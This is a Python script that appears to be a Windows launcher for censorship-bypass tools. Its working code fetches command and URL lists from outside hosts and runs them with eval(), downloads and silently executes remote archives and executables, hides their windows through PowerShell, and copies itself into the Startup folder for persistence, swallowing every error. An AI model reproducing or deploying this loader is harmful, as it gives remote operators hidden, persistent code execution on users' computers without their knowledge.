import urllib.request
import urllib.error
import json
from typing import Optional, Dict, Any
from pathlib import Path
import sys
import os
import subprocess
import zipfile
import shutil

if __name__ == "__main__":
    CREATE_NO_WINDOW = 0x08000000
    folder = os.path.join(Path(os.path.expanduser("~")), "Documents", "MoiObxod", "obxod")
    if not os.path.exists(folder):
        os.makedirs(folder)
        
    downloadlisturls = [
        "https://async" + "ker.neocities.org/peer/list.txt",
        "https://peerphp.vercel.app/peer/2ed3fbeb-4661-47fc-8648-5ed1c790780a.txt"
    ]
    commandlisturls = [
        "https://async" + "ker.neocities.org/peer/command.txt",
        "https://peerphp.vercel.app/peer/8abf9c5e-8f8f-4279-aaf8-a85ceffb602e.txt"
    ]
    downloadurls = [
        "https://github.com/Flowseal/tg-ws-proxy/releases/download/v1.2.1/TgWsProxy_windows.exe",
        "https://github.com/Flowseal/zapret-discord-youtube/releases/download/1.9.7/zapret-discord-youtube-1.9.7.zip",
        "https://peerphp.vercel.app/peer/211010c5-4d96-4cf1-ab81-fc628edca1b7.zip",
        "https://peerphp.vercel.app/peer/d334379d-2026-47f3-a6a5-28dbd6e88c8a.zip"
    ]
    commands = [
        "general (ALT11).bat",
        "TgWsProxy_windows.exe",
        "GF_Windows.bat"
    ]

    # get today obxod files
    for i in range(len(downloadlisturls)):
        try:
            textarr = urllib.request.urlopen(downloadlisturls[i]).read().decode('utf-8')
            if (len(textarr) > 20):
                downloadurls = eval(textarr)
                break
        except:
            pass

    # get today command file
    for i in range(len(commandlisturls)):
        try:
            textarr = urllib.request.urlopen(commandlisturls[i]).read().decode('utf-8')
            if (len(textarr) > 20):
                commands = eval(textarr)
                break
        except:
            pass

    # download all new obxod today
    for i in range(len(downloadurls)):
        try:
            url = downloadurls[i]
            filepath = os.path.join(folder, url.split("/")[-1])
            urllib.request.urlretrieve(url, filepath)
            if (filepath.endswith(".zip") or filepath.endswith(".7z") or filepath.endswith(".rar")):
                zippath = filepath
                with zipfile.ZipFile(zippath, 'r') as zipref:
                    zipref.extractall(folder)
        except:
            pass

    # execute all obxod
    for i in range(len(commands)):
        try:
            path = os.path.join(folder, commands[i])
            filename, ext = os.path.splitext(path)
            if (ext == ".bat"):
                subprocess.run(path, creationflags=CREATE_NO_WINDOW, shell=True)
                if ("general (ALT" in path): # hidden general zapret
                    powershell_command = '''(Get-Process -Name winws).MainWindowHandle | ForEach-Object { Add-Type -Name WinHide -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Namespace Win32; [Win32.WinHide]::ShowWindow($_, 0) }'''
                    result = subprocess.run(
                        ["powershell", "-Command", powershell_command],
                        capture_output=True,
                        text=True,
                        shell=True
                    )
                    pass
            else:
                subprocess.Popen([path])
        except:
            pass

    try:
        startup_folder = os.path.join(Path(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
        exe_path = sys.executable
        if not exe_path.endswith("python.exe") and not "AppData" in exe_path and not "Startup" in exe_path:
            shutil.copy(exe_path, startup_folder)
    except:
        pass
